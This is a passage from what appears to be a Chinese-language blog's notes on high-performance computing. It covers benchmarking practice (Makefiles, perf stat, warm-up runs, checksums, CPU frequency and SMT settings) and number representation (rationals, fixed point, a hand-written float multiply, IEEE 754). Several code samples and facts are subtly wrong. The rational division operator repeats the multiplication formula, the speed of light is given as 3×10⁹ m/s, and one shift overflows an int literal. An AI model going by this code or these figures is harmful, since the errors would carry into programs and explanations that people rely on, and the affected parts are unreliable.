class="keyword">.PHONY</span>: %.run  # 声明run为伪目标</span></span><br></pre></td></tr></table></figure></div>
<p><strong>解释</strong></p>
<ul>
<li><code>compile</code>: 定义了一个编译命令，使用 <code>g++</code> 编译器，启用了C++17标准，开启了最大优化 <code>-O3</code>，指定了本地体系结构优化 <code>-march=native</code>，并显示警告信息 <code>-Wall</code>。</li>
<li><code>%.cc</code> 到 <code>gcd.hh</code>：编译源文件（<code>.cc</code>）并链接到一个可执行文件（默认文件名）。<code>$&lt;</code>表示当前依赖文件（在这种情况下是源代码文件）。</li>
<li><code>%.s</code>：为源文件生成汇编代码，使用了 <code>-S</code> 和 <code>-fverbose-asm</code>，生成详细的汇编输出。<code>$@</code>是目标文件的名称。</li>
<li><code>%.run</code>：通过 <code>@./$&lt;</code> 运行生成的可执行文件，<code>$&lt;</code> 表示编译后的目标文件。</li>
<li><code>.PHONY</code>: 用于声明伪目标，确保即使存在同名文件，Make也能正常执行。</li>
</ul>
<p>使用这个Makefile，你可以通过简单的命令来编译和运行程序，例如：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">make example      <span class="comment"># 编译example.cc为可执行文件</span></span><br><span class="line">make example.run  <span class="comment"># 运行example</span></span><br></pre></td></tr></table></figure></div>
<p><strong>与性能分析结合</strong></p>
<p>你还可以在Makefile中加入性能分析的脚本。例如，通过 <code>perf stat</code> 来自动化性能剖析：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">%.perf: %</span></span><br><span class="line">	@perf stat ./<span class="variable">$&lt;</span></span><br></pre></td></tr></table></figure></div>
<p>这样，你就可以运行 <code>make example.perf</code> 来获取运行的性能统计数据。</p>
<h5 id="Jupyter-Notebooks使用"><a href="#Jupyter-Notebooks使用" class="headerlink" title="Jupyter Notebooks使用"></a>Jupyter Notebooks使用</h5><p>为了进一步加速高层次的分析，你可以在Jupyter Notebook中整理你的脚本并生成图表。可以通过编写一个基准测试函数来自动化测试不同算法实现的性能：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bench</span>(<span class="params">source, n=<span class="number">2</span>**<span class="number">20</span></span>):</span><br><span class="line">    !make -s &#123;source&#125;</span><br><span class="line">    <span class="keyword">if</span> _exit_code != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Compilation failed&quot;</span>)</span><br><span class="line">    res = !./&#123;source&#125; &#123;n&#125;</span><br><span class="line">    duration = <span class="built_in">float</span>(res[<span class="number">0</span>].split()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> duration</span><br></pre></td></tr></table></figure></div>
<p>在这个函数中，<code>make -s &#123;source&#125;</code> 会编译源代码并生成目标文件。如果编译失败，它会抛出异常。然后，使用 <code>!./&#123;source&#125; &#123;n&#125;</code> 运行编译后的程序并返回执行时间。</p>
<p>一旦有了基准测试的函数，你就可以轻松地编写清晰的分析代码：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">ns = <span class="built_in">list</span>(<span class="built_in">int</span>(<span class="number">1.17</span>**k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">60</span>))</span><br><span class="line">baseline = [bench(<span class="string">&#x27;std_lower_bound&#x27;</span>, n=n) <span class="keyword">for</span> n <span class="keyword">in</span> ns]</span><br><span class="line">results = [bench(<span class="string">&#x27;my_binary_search&#x27;</span>, n=n) <span class="keyword">for</span> n <span class="keyword">in</span> ns]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制不同数组大小下的相对加速图</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.plot(ns, [x / y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(baseline, results)])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></div>
<h4 id="获取准确的结果"><a href="#获取准确的结果" class="headerlink" title="获取准确的结果"></a>获取准确的结果</h4><p>为了使测试的结果更加准确，我们需要考虑如下的几个点：</p>
<p><strong>1.不同的数据集</strong></p>
<p>由于很多算法的效率很大程度上受数据分布的影响，我们需要选取尽可能贴近实际使用的数据分布来进行测试。例如如下的有序数据集，会使分支很容易预测。而随机打乱的数据集就会让cpu难以通过执行的历史预测之后的分支取向。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// don&#x27;t do this</span></span><br><span class="line"><span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">0</span>; a &lt; <span class="number">1000</span>; a++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt; <span class="number">1000</span>; b++)</span><br><span class="line">        checksum ^= gcd(a, b);</span><br><span class="line"></span><br><span class="line"><span class="comment">// do things such as this</span></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>], b[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    a[i] = rand() % <span class="number">1000</span>, b[i] = rand() % <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; <span class="number">1000</span>; t++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">        checksum += gcd(a[i], b[i]);</span><br></pre></td></tr></table></figure></div>
<p><strong>2.多个优化目标</strong></p>
<p>如哈希表，可能需要在内存占用、查询时间等多个维度进行权衡。</p>
<p><strong>3.吞吐量 vs 延迟</strong></p>
<p>在现代 CPU 上，指令并不会<strong>严格顺序执行</strong>，而是可以 <strong>乱序执行</strong> 和 <strong>流水线并行处理</strong>。因此，如果一个任务<strong>可以与其他任务同时进行</strong>，那么它的<strong>吞吐量</strong>可能比<strong>单个操作的真实延迟更低</strong>。所以下面的代码只能测试吞吐量。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    q[i] = rand();  <span class="comment">// 生成随机查询</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= lower_bound(q[i]);  <span class="comment">// 查找 q[i] 并计算 checksum</span></span><br></pre></td></tr></table></figure></div>
<p>为了测试真实的延迟，我们需要手动引入数据依赖，这样子<strong>CPU 无法并行执行多个查询</strong>，每个 <code>lower_bound</code> <strong>必须等待前一个完全结束</strong>，流水线和乱序执行的优化作用变小。测得的时间更接近单个查询的真实执行时间。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= lower_bound(checksum ^ q[i]);  </span><br></pre></td></tr></table></figure></div>
<p><strong>4.冷缓存</strong></p>
<p>当数据最初不在 CPU 缓存（cache）中时，内存读取的时间会更长。在开始正式测量之前，<strong>先运行一次预热（warm-up）</strong>，这样数据就会被加载到缓存中，避免缓存未命中的影响：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 预热运行（warm-up run）</span></span><br><span class="line"><span class="keyword">volatile</span> checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= <span class="built_in">lower_bound</span>(q[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正式运行（actual run）</span></span><br><span class="line"><span class="type">clock_t</span> start = <span class="built_in">clock</span>();</span><br><span class="line">checksum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= <span class="built_in">lower_bound</span>(q[i]);</span><br></pre></td></tr></table></figure></div>
<h4 id="过度优化（Over-Optimization）"><a href="#过度优化（Over-Optimization）" class="headerlink" title="过度优化（Over-Optimization）"></a><strong>过度优化（Over-Optimization）</strong></h4><p>有时<strong>基准测试（benchmark）本身是不正确的</strong>，因为编译器可能<strong>直接优化掉</strong>被测试的代码，导致测量结果没有意义。</p>
<p><strong>如何防止编译器优化掉基准测试？</strong></p>
<ol>
<li><p><strong>使用校验和（checksum）</strong></p>
<p>在测试代码中使用 <code>checksum</code> 变量，并在最后输出，<strong>避免编译器省略计算</strong>。</p>
<p>例如：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= <span class="built_in">lower_bound</span>(q[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;checksum: %d\n&quot;</span>, checksum); <span class="comment">// 防止优化</span></span><br></pre></td></tr></table></figure></div>
<p>如果 <code>lower_bound(q[i])</code> 的计算结果没有影响最终程序逻辑，编译器可能会认为它是<strong>无效计算</strong>并移除，导致错误的测量结果。</p>
</li>
<li><p><strong>使用 <code>volatile</code> 限定符</strong></p>
<p><code>volatile</code>关键字告诉编译器不要优化该变量的访问，确保它在每次循环迭代时都被真正计算：</p>
  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> checksum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    checksum ^= <span class="built_in">lower_bound</span>(q[i]);</span><br></pre></td></tr></table></figure></div>
<p>作用：</p>
<ul>
<li><p><strong>防止编译器优化掉整个计算过程</strong>。</p>
</li>
<li><p><strong>防止循环迭代之间的指令重排（interleaving）</strong>，确保按顺序执行。</p>
</li>
</ul>
</li>
</ol>
<h4 id="减少噪音"><a href="#减少噪音" class="headerlink" title="减少噪音"></a>减少噪音</h4><p>在基准测试（benchmarking）中，除了<strong>偏差（bias）</strong>，还有<strong>噪声（noise）\</strong>会影响测量结果。偏差通常会*<em>系统性地<strong>使某个算法占优，而噪声则会导致</strong>随机波动*</em>，增加测试的方差（variance），使结果不稳定。</p>
<p><strong>噪声的来源</strong></p>
<ol>
<li><p><strong>外部干扰（Side Effects &amp; External Noise）</strong></p>
<ul>
<li>其他进程运行时占用 CPU 资源，影响算法性能测试。</li>
<li>CPU 频率自动调节（CPU Frequency Scaling）。</li>
<li>超线程（Hyper-Threading）导致 CPU 资源共享，影响单核性能。</li>
</ul>
</li>
<li><p><strong>如何减少噪声？</strong></p>
<p><strong>使用 <code>perf stat</code> 统计 CPU 周期（cycles）</strong></p>
<ul>
<li>若基准测试的是<strong>计算密集型（compute-bound）算法</strong>，推荐使用 <code>perf stat</code> 直接测量 <strong>CPU 执行指令的周期</strong>，而不是依赖时间戳。</li>
<li>CPU 频率可能会波动，影响测试的时间，但 <code>perf stat</code>计数的指令周期数不会受到影响，这样可以得到一个独立于 CPU 频率波动的性能测量。</li>
</ul>
<p><strong>固定 CPU 频率</strong></p>
<ul>
<li><p>CPU 可能会根据负载自动调整频率，这会导致每次运行基准测试的结果不同，因此需要手动锁定频率：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> cpupower frequency-set -g performance  <span class="comment"># 设置为最高性能模式</span></span><br></pre></td></tr></table></figure></div>
<p>或者：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> cpupower frequency-set -g powersave  <span class="comment"># 限制 CPU 频率最低</span></span><br></pre></td></tr></table></figure></div>
<p>这样可以确保 CPU 频率不会在测试过程中波动。</p>
</li>
<li><p><strong>关闭超线程（Hyper-Threading）</strong></p>
<ul>
<li><p>超线程允许 CPU <strong>一个物理核心同时运行两个线程</strong>，但这可能导致基准测试结果受其他进程影响。</p>
</li>
<li><p>关闭超线程的方法：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> off | <span class="built_in">sudo</span> <span class="built_in">tee</span> /sys/devices/system/cpu/smt/control</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>或者在 BIOS/UEFI 中手动禁用超线程。</p>
</li>
</ul>
</li>
<li><p><strong>绑定 CPU 核心，确保独占</strong></p>
<ul>
<li><p>如果希望某个程序只运行在特定 CPU 核心上，可以使用 <code>taskset</code> 绑定：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">taskset -c 0 ./my_program  <span class="comment"># 仅在 CPU 0 上运行</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>这样可以避免操作系统随意调度进程到不同核心，减少基准测试的波动。</p>
</li>
</ul>
</li>
<li><p><strong>关闭网络和不必要的进程</strong></p>
<ul>
<li>关闭后台进程，特别是可能影响 CPU 占用的任务，如自动更新、后台同步等。</li>
<li>关闭 Wi-Fi 和网络，以防止网络中断或后台任务影响基准测试。</li>
</ul>
</li>
<li><p><strong>尽量减少用户操作</strong></p>
<ul>
<li><strong>鼠标移动</strong>等 UI 交互会触发 CPU 处理中断，可能影响测试结果。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>即使采取了以上所有措施，仍然无法<strong>完全</strong>消除噪声。例如程序的名字也会影响执行速度。</p>
<ul>
<li>因为可执行文件名会存储在环境变量中，环境变量存储在<strong>调用栈（call stack）</strong>中，导致栈的对齐（stack alignment）发生变化。</li>
<li>这可能会让数据访问跨越 <strong>cache line</strong> 或 <strong>内存页边界（memory page boundary）</strong>，导致访问速度变慢。</li>
</ul>
<p><strong>如何正确分析基准测试结果</strong></p>
<ol>
<li><strong>不要过分解读小幅度变化</strong><ul>
<li>在 <strong>笔记本电脑</strong> 或 <strong>测试时间小于 1 秒</strong> 时，<strong>±5%</strong> 的波动是完全正常的，不要过度解读微小的性能变化。</li>
<li>如果你看到 <strong>+1%</strong> 的性能提升，不要立刻下结论，而是<strong>运行足够多次，计算方差和 p-value</strong>，确保统计显著性（statistical significance）。</li>
</ul>
</li>
<li><strong>使用 A/B 测试方法</strong><ul>
<li>和 A/B 测试一样，要<strong>多次运行并比较</strong>两个版本的性能，不要只跑一次就下结论。</li>
<li>计算<strong>均值、方差、p 值</strong>，确保你的优化方案确实带来了可测量的提升。</li>
</ul>
</li>
</ol>
<h3 id="六、算术（Arithmetic）"><a href="#六、算术（Arithmetic）" class="headerlink" title="六、算术（Arithmetic）"></a>六、算术（Arithmetic）</h3><h4 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h4><p>事实上，浮点运算通常比整数运算更快，这是因为现代处理器中有专门的浮点运算指令。此外，浮点数的表示方法经过严格的标准化，并遵循<strong>简单且确定性</strong>的舍入规则，使得计算误差可以可靠地管理。当我们需要对数字执行<strong>位运算</strong>时，浮点运算单元（FPU，负责浮点计算的协处理器）通常<strong>不支持</strong>这些操作。此时，数值需要被<strong>转换为整数</strong>。</p>
<p>在正式介绍浮点数规则之前，我们可以先来看一下一些其它的可能的解决方案。</p>
<h5 id="符号表达式"><a href="#符号表达式" class="headerlink" title="符号表达式"></a>符号表达式</h5><p>第一种也是最繁琐的方法是<strong>存储产生结果的代数表达式</strong>，而不是直接存储计算后的数值。在某些应用（如计算几何）中，除了加、减、乘运算之外，还需要执行<strong>不带舍入的除法</strong>，即使用两个整数的<strong>比值</strong>（即有理数）来精确表示结果。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">r</span> &#123;</span><br><span class="line">    <span class="type">int</span> x, y;	<span class="comment">// x存分子，y存分母</span></span><br><span class="line">    <span class="comment">// 保持最简分数</span></span><br><span class="line">    <span class="built_in">r</span>(<span class="type">int</span> x, <span class="type">int</span> y) : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y) &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &lt; <span class="number">0</span>)  <span class="comment">// 规范化，使分母始终为正</span></span><br><span class="line">            x = -x, y = -y;</span><br><span class="line">        <span class="type">int</span> g = <span class="built_in">gcd</span>(x, y); <span class="comment">// 计算最大公约数</span></span><br><span class="line">        x /= g;</span><br><span class="line">        y /= g;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一些基本运算</span></span><br><span class="line">r <span class="keyword">operator</span>+(r a, r b) &#123; <span class="keyword">return</span> &#123;a.x * b.y + a.y * b.x, a.y * b.y&#125;; &#125;</span><br><span class="line">r <span class="keyword">operator</span>*(r a, r b) &#123; <span class="keyword">return</span> &#123;a.x * b.x, a.y * b.y&#125;; &#125;</span><br><span class="line">r <span class="keyword">operator</span>/(r a, r b) &#123; <span class="keyword">return</span> &#123;a.x * b.x, a.y * b.y&#125;; &#125;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;(r a, r b) &#123; <span class="keyword">return</span> a.x * b.y &lt; b.x * a.y; &#125;</span><br></pre></td></tr></table></figure></div>
<p>这种方法可以<strong>保持绝对精度</strong>，不会因浮点运算误差导致结果不准确。但它的<strong>计算代价</strong>很高：</p>
<ol>
<li>计算机需要存储每一步计算的<strong>历史操作</strong>，而不是简单存储最终数值。</li>
<li>计算时不仅要计算当前结果，还需要考虑所有之前的计算过程，这会导致<strong>计算量呈指数级增长</strong>。</li>
</ol>
<p>因此，这种方法通常适用于：</p>
<ul>
<li>计算精度要求极高的场景（如代数几何、数论）。</li>
<li>计算步骤相对较少的应用（如解析数学计算）。</li>
<li>计算机代数系统（CAS），如 Mathematica、SymPy 和 SageMath。</li>
</ul>
<p>但在一般数值计算中，由于其高昂的<strong>存储和计算成本</strong>，往往采用<strong>浮点数近似计算</strong>来提高效率。</p>
<h5 id="定点数"><a href="#定点数" class="headerlink" title="定点数"></a>定点数</h5><p>定点数是一种<strong>仅使用整数</strong>但<strong>隐式表示小数</strong>的方法，本质上就是把数值<strong>乘以一个固定的比例因子</strong>（通常是某个 10 的幂或 2 的幂）。</p>
<p>这种方法类似于<strong>更改测量单位</strong>，让所有运算都在放大后的整数范围内进行。</p>
<p>金融软件通常使用<strong>固定精度</strong>来存储货币值，例如 <strong>NASDAQ 股票交易所</strong>使用 <strong>1/10000 美元</strong>作为最小单位，即所有金额精确到<strong>小数点后 4 位</strong>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">money</span> &#123;</span><br><span class="line">    uint v; <span class="comment">// 以 1/10000 美元为单位存储金额</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">to_string</span><span class="params">(money m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> std::format(<span class="string">&quot;$&#123;&#125;.&#123;:04d&#125;&quot;</span>, m.v / <span class="number">10000</span>, m.v % <span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">money <span class="keyword">operator</span>*(money x, money y) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;x.v * y.v / <span class="number">10000</span>&#125;; <span class="comment">// 乘法需要缩放回正确的单位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>定点数的一个重大问题是<strong>比例因子选得不合适</strong>时，可能会导致<strong>整数溢出</strong>或<strong>精度损失</strong>。定点数不适用于大范围数值计算。比如考虑爱因斯坦质能方程：$E=mc^2$。质量 <code>m</code> 大约是 <strong>1.67 × 10⁻²⁷ kg</strong>。光速 <code>c</code> 约为 <strong>3 × 10⁹ m/s</strong>。</p>
<p>在这种场景下：</p>
<ul>
<li><strong>如果比例因子太大</strong>，那么 <code>m</code> 可能会被舍入到 <code>0</code>，导致能量计算错误。</li>
<li><strong>如果比例因子太小</strong>，那么 <code>E</code> 可能会溢出，导致计算无法进行。</li>
</ul>
<h5 id="浮点数-1"><a href="#浮点数-1" class="headerlink" title="浮点数"></a>浮点数</h5><p>在实际的应用场景中，我们主要关注数据的相对误差。我们通常希望计算结果的误差不超过<strong>0.01%</strong>。我们关心的是这个误差相对于数值本身的比例，而不关心它的绝对大小。</p>
<p>为了满足这个需求，<strong>浮点数</strong>使用了一种特殊的存储方式，它存储一个数字的<strong>有效数字</strong>（又称<strong>尾数</strong>或<strong>manitssa</strong>），并通过一个<strong>指数</strong>（exponent）进行缩放。在计算机中，数值是用<strong>固定长度的二进制字</strong>来存储的，因此我们希望设计一种<strong>固定长度的二进制浮点格式</strong>，其中部分比特用于存储尾数（以提供更高的精度），而另一部分比特用于存储指数（以提供更大的数值范围）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fp</span> &#123;</span></span><br><span class="line">    <span class="type">bool</span> s;     <span class="comment">// sign: &quot;0&quot; for &quot;+&quot;, &quot;1&quot; for &quot;-&quot; </span></span><br><span class="line">    <span class="type">unsigned</span> m; <span class="comment">// mantissa</span></span><br><span class="line">    <span class="type">int</span> e;      <span class="comment">// exponent</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>这样，一个浮点数可以表示为：</p>
<script type="math/tex; mode=display">
\pm (1+m) \times 2^e</script><p>其中，$m$ 和 $e$ 都是整数（可能为负数）。这种表示方式的一个特点是，它的<strong>分布非常不均匀</strong>——在区间 $[0,1)$ 内的数与 $[1, +\infty)$ 内的数的数量大致相同。</p>
<p>这里的定义是m作为小数点后的尾数，并且这是因为浮点数的表示并<strong>不是唯一的</strong>。例如，数字 1 可以表示为：</p>
<script type="math/tex; mode=display">
1 \times 2^0 = 2 \times 2^{-1} = 256 \times 2^{-8}</script><p>同样的数可以有<strong>多种不同的表示方式</strong>，在某些应用（如<strong>比较或哈希计算</strong>）中，这可能会带来问题。为了解决这个问题，我们可以使用<strong>标准化（Normalization）</strong>，即强制遵循某种约定。在十进制中，我们通常把小数点放在第一个非零数字之后（如<strong>6.022e23</strong>），在二进制中，我们也可以做类似的标准化：</p>
<script type="math/tex; mode=display">
42 = 101010_2 = 1.0101_2 \times 2^5</script><p>观察这个表示方式后，我们发现二进制数的<strong>最高位始终是 1</strong>。这意味着我们<strong>不需要显式存储这一位</strong>，只需要存储剩下的部分，即一个介于 $[0,1)$ 之间的数。这样，我们的可表示数的集合变成了：</p>
<script type="math/tex; mode=display">
\{\pm (1 + m) \times 2^e \mid m = \frac{x}{2^{32}}, x \in [0, 2^{32})\}</script><p>这里的<strong>m</strong>在存的时候是一个无符号整型，公式中将m的范围看作[0,1)只是一个逻辑映射，在数学上这个<strong>m</strong>就代表小数点后的内容。</p>
<p>然后我们看这个自定义的浮点数的乘法运算符合的规律：</p>
<script type="math/tex; mode=display">
c = a*b\\
=(s_a*(1+m_a)*2^{e_a})*(s_b*(1+m_b)*2^{e_b})\\
=s_a*s_b*(1+m_a+m_b+m_a*m_b)*2^{e_a+e_b}\\
s_c=s_a*s_b\ ;m_c=m_a+m_b+m_a*m_b\ ;e_c=e_a+e_b</script><p>这里有两个问题需要进行解决：</p>
<ul>
<li>乘法运算之后m的值域成了 $[0,3)$ 我们需要进行处理将其归为标准的 $[0,1)$ ，采用的公式如下：</li>
</ul>
<script type="math/tex; mode=display">
1+m = (1+1) + (m-1)=(1+\frac{m-1}{2})*2</script><p>这样我们通过提取一个系数2增加了e，又能够成功将m的值域变回 $[0,1)$。</p>
<ul>
<li><strong>可能因为精度不够而无法对结果进行表示</strong>，因为 <code>m_a * m_b</code> 可能会超过可表示的范围。我们能够做的就是进行四舍五入。</li>
</ul>
<p>完整的乘法实现如下，由于计算 <code>m_a * m_b</code> 需要<strong>额外的精度</strong>，我们使用 64 位整数进行中间计算，并进行标准化处理：：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp operator*(fp a, fp b) &#123;</span><br><span class="line">    fp c;</span><br><span class="line">    c.s = a.s ^ b.s;	<span class="comment">// 计算符号位</span></span><br><span class="line">    c.e = a.e + b.e;	<span class="comment">// 计算指数</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">uint64_t</span> x = a.m, y = b.m; <span class="comment">// 转换为 64 位整数进行计算</span></span><br><span class="line">    <span class="type">uint64_t</span> m = (x &lt;&lt; <span class="number">31</span>) + (y &lt;&lt; <span class="number">31</span>) + x * y; <span class="comment">// 计算 62 或 63 位的中间结果</span></span><br><span class="line">    <span class="keyword">if</span> (m &amp; (<span class="number">1</span>&lt;&lt;<span class="number">62</span>)) &#123; 			<span class="comment">// 检查是否溢出</span></span><br><span class="line">        m -= (<span class="number">1</span>&lt;&lt;<span class="number">62</span>); 			<span class="comment">// m -= 1;</span></span><br><span class="line">        m &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        c.e++;		<span class="comment">// 指数加 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    m += (<span class="number">1</span>&lt;&lt;<span class="number">30</span>); 	<span class="comment">// 进行四舍五入（加 0.5）</span></span><br><span class="line">    c.m = m &gt;&gt; <span class="number">31</span>;	<span class="comment">// 舍入并截取尾数</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="硬件浮点运算"><a href="#硬件浮点运算" class="headerlink" title="硬件浮点运算"></a><strong>硬件浮点运算</strong></h5><p>在某些应用中，我们需要<strong>更高的精度</strong>，这时候可以使用<strong>软件浮点运算</strong>（如 <code>fp</code> 结构体实现的方式）。但是，软件浮点计算的<strong>效率很低</strong>，因为它需要执行多个指令。</p>
<p>为了提高效率，<strong>现代 CPU 使用专门的硬件单元</strong>（如 x86 的<strong>浮点运算单元 FPU</strong>，又称 x87）。这些单元提供：</p>
<ul>
<li><strong>专门的寄存器</strong>（x87 寄存器栈）</li>
<li><strong>支持浮点运算的指令集</strong></li>
<li><strong>支持三角函数、指数、对数、平方根等复杂运算</strong></li>
</ul>
<p>这些硬件优化让浮点计算变得高效，并且大多数现代处理器都集成了浮点单元（如 x86 的 SSE、AVX 指令集）。</p>
<p>在后续部分，我们会探讨<strong>浮点数表示的一些更详细的特性</strong>，以及它如何在现代 CPU 中实际运作。</p>
<h4 id="IEEE-754-浮点算术标准"><a href="#IEEE-754-浮点算术标准" class="headerlink" title="IEEE 754 浮点算术标准"></a>IEEE 754 浮点算术标准</h4><p>当我们设计自己的浮点数类型时，我们省略了许多重要的细节，例如：</p>
<ul>
<li><strong>我们应该为尾数（Mantissa）和指数（Exponent）分别分配多少位？</strong></li>
<li><strong>符号位（Sign bit）为 0 是否表示正数，还是相反？</strong></li>
<li><strong>这些位在内存中是如何存储的？</strong></li>
<li><strong>零（0）应该如何表示？</strong></li>
<li><strong>具体的舍入（Rounding）规则是什么？</strong></li>
<li><strong>如果我们对零进行除法运算，会发生什么？</strong></li>
<li><strong>如果我们对负数求平方根，会发生什么？</strong></li>
<li><strong>如果我们递增到最大可表示的数，会发生什么？</strong></li>
<li><strong>我们是否能检测到上述某些特殊情况发生了？</strong></li>
</ul>
<p>在早期计算机中，通常不支持浮点运算。当各大厂商开始添加浮点协处理器时，它们对这些问题的答案各不相同。不同的浮点数实现使得浮点运算的可靠性和可移植性变得困难，尤其是对编译器开发者而言。</p>
<p><strong>IEEE 754 标准</strong><br> 1985 年，<strong>IEEE（电气和电子工程师学会）</strong> 发布了 IEEE 754 标准，该标准正式规范了浮点数的运作方式。很快，各大厂商纷纷采纳该标准，如今它几乎被所有通用计算机采用。</p>
<p>与我们自己实现的浮点数类似，<strong>硬件浮点数</strong> 采用 1 位表示符号，指数和尾数部分的位数则因格式而异。例如，<strong>标准的 32 位浮点数（单精度）</strong> 采用：</p>
<ul>
<li><strong>最高位（1 位）</strong>：符号位（Sign bit）</li>
<li><strong>接下来的 8 位</strong>：指数位（Exponent）</li>
<li><strong>剩下的 23 位</strong>：尾数（Mantissa）</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/float.svg"
                      class=""
                >
<p>采用这个存储顺序的原因之一是便于比较和排序。<br>在硬件中，我们可以直接使用<strong>无符号整数比较器</strong>来比较浮点数，仅在负数情况下对部分位进行翻转，以确保比较的正确性。</p>
<p><strong>指数的偏移量（Bias）</strong></p>
